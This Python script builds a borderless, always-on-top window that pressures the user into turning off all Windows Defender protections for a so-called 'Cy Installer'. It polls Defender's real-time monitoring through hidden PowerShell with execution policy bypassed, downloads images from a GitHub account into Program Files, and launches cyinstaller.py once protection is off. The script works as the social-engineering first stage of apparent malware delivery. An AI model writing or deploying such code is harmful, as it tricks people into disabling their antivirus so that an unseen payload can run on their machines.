# security.py
import customtkinter as ctk
from PIL import Image, ImageTk
import subprocess
import sys
import time
import urllib.request
import os

ctk.set_appearance_mode("System")
ctk.set_default_color_theme("blue")

def check_real_time_protection():
    powershell_script = """
    $realTimeProtection = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
    if ($realTimeProtection -eq $true) {
        exit 0
    } else {
        exit 1
    }
    """

    result = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_script],
                            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

    if result.returncode == 0:
        return True
    else:
        return False

def launch_cyinstaller():
    print("Defender is off! Launching CyInstaller...")
    subprocess.Popen(["python", "cyinstaller.py"])
    sys.exit()

if check_real_time_protection():
    print("Defender is off! Launching CyInstaller...")
    launch_cyinstaller()

def download_image(url, file_path):
    try:
        urllib.request.urlretrieve(url, file_path)
        print(f"Downloaded {file_path} from {url}")
        return True
    except Exception as e:
        print(f"Failed to download {file_path}: {e}")
        return False

program_files_path = os.environ["ProgramFiles"]
ci_images_dir = os.path.join(program_files_path, "CIimages")
security_image_url = "https://github.com/Topfloorbosshaha/images/raw/main/security.png"
shield_image_url = "https://github.com/Topfloorbosshaha/images/raw/main/shield.png"
security_image_path = os.path.join(ci_images_dir, "security.png")
shield_image_path = os.path.join(ci_images_dir, "shield.png")

if not os.path.exists(ci_images_dir):
    print(f"Creating directory: {ci_images_dir}")
    os.makedirs(ci_images_dir)

if not os.path.exists(security_image_path):
    print("Downloading security.png...")
    download_image(security_image_url, security_image_path)
else:
    print("security.png already exists. Skipping download.")

if not os.path.exists(shield_image_path):
    print("Downloading shield.png...")
    download_image(shield_image_url, shield_image_path)
else:
    print("shield.png already exists. Skipping download.")

app = ctk.CTk()
app.title("")
app.geometry("750x450")
app.attributes("-topmost", True)
app.overrideredirect(True)

def make_draggable(event):
    x = event.x_root - offset_x
    y = event.y_root - offset_y
    app.geometry(f"+{x}+{y}")

def on_press(event):
    global offset_x, offset_y
    offset_x = event.x
    offset_y = event.y

app.bind("<ButtonPress-1>", on_press)
app.bind("<B1-Motion>", make_draggable)
original_image = Image.open(security_image_path)
target_width = 345
width_percent = (target_width / float(original_image.size[0]))
target_height = int((float(original_image.size[1]) * float(width_percent)))
resized_image = original_image.resize((target_width, target_height))
resized_image_tk = ImageTk.PhotoImage(resized_image)
image_label = ctk.CTkLabel(app, image=resized_image_tk, text="")
image_label.place(x=15, y=20)
frame = ctk.CTkFrame(app, width=366, height=420, corner_radius=7)
frame.place(x=375, y=15)
label1 = ctk.CTkLabel(frame, text="Disable Windows Security", font=("Arial", 12, "bold"))
label1.place(x=16, y=8)
label2 = ctk.CTkLabel(frame, text="To start using Cy Installer, Windows Security", font=("Arial", 12))
label2.place(x=16, y=38)
label3 = ctk.CTkLabel(frame, text="must be disabled, as it'll interfere.", font=("Arial", 12))
label3.place(x=16, y=63)
label4 = ctk.CTkLabel(frame, text="1.", font=("Arial", 12))
label4.place(x=12, y=120)
label5 = ctk.CTkLabel(frame, text="Click the button below to open Windows Security", font=("Arial", 12, "bold"))
label5.place(x=37, y=121)
label6 = ctk.CTkLabel(frame, text="2.", font=("Arial", 12))
label6.place(x=14, y=197)
label7 = ctk.CTkLabel(frame, text="Set all four security toggles to off.", font=("Arial", 12))
label7.place(x=39, y=197)
label8 = ctk.CTkLabel(frame, text="Checking Windows Security...", font=("Arial", 12, "bold"))
label8.place(x=72, y=260)
button = ctk.CTkButton(frame, text="Open Windows Security", width=138, height=31, fg_color="#666666", hover_color="#4a4a4a")
button.place(x=39, y=156)
progress_bar = ctk.CTkProgressBar(frame)
progress_bar.place(x=74, y=288)

shield_image = Image.open(shield_image_path)
shield_image = shield_image.resize((47, 47))
icon_image = ImageTk.PhotoImage(shield_image)
icon_label = ctk.CTkLabel(frame, image=icon_image, text="")
icon_label.place(x=15, y=260)

def open_windows_security():
    subprocess.Popen(["start", "windowsdefender://threatsettings/"], shell=True)

button.configure(command=open_windows_security)

def load_progress():
    progress_value = progress_bar.get() + 0.01
    if progress_value > 1:
        progress_value = 0
    progress_bar.set(progress_value)
    app.after(30, load_progress)

def check_defender_periodically():
    if check_real_time_protection():
        print("Defender off! Launching CyInstaller...")
        launch_cyinstaller()
    else:
        print("Defender still on... Checking again in 5 seconds.")
        app.after(5000, check_defender_periodically)

load_progress()
check_defender_periodically()
app.mainloop()
